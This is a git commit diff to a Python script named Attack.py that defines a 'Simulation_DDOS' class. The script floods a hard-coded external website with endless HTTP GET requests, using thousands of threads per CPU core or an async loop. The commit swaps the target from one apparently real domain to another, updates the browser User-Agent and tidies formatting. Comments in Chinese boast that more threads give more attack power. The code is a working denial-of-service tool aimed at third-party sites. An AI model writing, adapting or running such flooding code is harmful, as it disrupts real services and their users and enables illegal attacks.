db72415918d3caa810d34de1573408afaf23a89e
TenshinoOtoKafu <s3459897@gmail.com>
2023-12-10 01:51:29 +0800

    修正

--- python Implementation/爬蟲相關測試/Attack.py
+++ python Implementation/爬蟲相關測試/Attack.py
@@ -17,7 +17,7 @@ import socket
 class Simulation_DDOS:
     def __init__(self):
         self.headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
             "cache-control": "no-cache",
             "sec-fetch-mode": "no-cors",
             "sec-fetch-site": "same-origin"
@@ -27,27 +27,27 @@ class Simulation_DDOS:
         pass
 
     ###### 純線程請求 #####
-    def Thread_Attack(self,AttackTarget):
+    def Thread_Attack(self, AttackTarget):
         while True:
             try:
-                data = requests.get(AttackTarget,headers=self.headers)
-                print(f"state:{data}")
-                data.text
+                data = requests.get(AttackTarget, headers=self.headers)
+                print(f"state:{data}", flush=True)
+                content_bytes = data.content
             except Exception as e:
-                print(f"debug:{e}")
+                print(f"Error", flush=True)
                 continue
 
-    def Thread_Trigger(self,url):
+    def Thread_Trigger(self, url):
         # 線程數越高攻擊力越強 , 電腦性能也消耗的越大
         for _ in range(2500):
-            threading.Thread(target=self.Thread_Attack,args=(url,)).start()
+            threading.Thread(target=self.Thread_Attack, args=(url,)).start()
 
     ###### 異步請求 #####
-    async def Asynchronous_Attack(self,Session,AttackTarget):
+    async def Asynchronous_Attack(self, Session, AttackTarget):
         async with Session.get(AttackTarget, headers=self.headers) as response:
             await response.text()
 
-    def Asynchronous_Trigger(self,url):
+    def Asynchronous_Trigger(self, url):
         async def Trigger():
             while True:
                 async with aiohttp.ClientSession() as session:
@@ -61,12 +61,12 @@ if __name__ == "__main__":
     ddos = Simulation_DDOS()
     cpu = multiprocessing.cpu_count() - 1
 
-    Attack = "https://babe-faka.com/"
+    Attack = "https://eden1113.com/"
 
     with ProcessPoolExecutor(max_workers=cpu) as executor:
         for _ in range(cpu):
             # 線程請求攻擊 , 簡單暴力 , 消耗資源高 , 硬體性能與網速足夠快 , 攻擊力度就夠大
-            executor.submit(ddos.Thread_Trigger,Attack)
+            executor.submit(ddos.Thread_Trigger, Attack)
 
             # 異步請求攻擊 , 攻擊力度低 , 電腦資源消耗較少
             # executor.submit(ddos.Asynchronous_Trigger,Attack)
